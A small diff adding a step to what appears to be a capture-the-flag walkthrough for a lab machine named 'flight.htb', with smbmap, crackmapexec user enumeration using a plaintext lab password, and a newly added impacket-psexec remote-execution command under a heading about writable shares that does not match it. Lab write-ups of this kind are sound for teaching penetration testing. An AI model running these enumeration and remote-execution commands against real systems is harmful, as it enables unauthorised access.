@@ -185,6 +185,12 @@ smbmap -H 10.10.11.152
 ```
 ![image](https://user-images.githubusercontent.com/19478700/213701493-aea51ee8-7705-4d1c-90e0-b2899c99ff67.png)
 
+See what shares can a user write to:
+```s
+impacket-psexec flight.htb/svc_apache@flight.htb
+```
+
+
 ### Users
 ```s
 crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
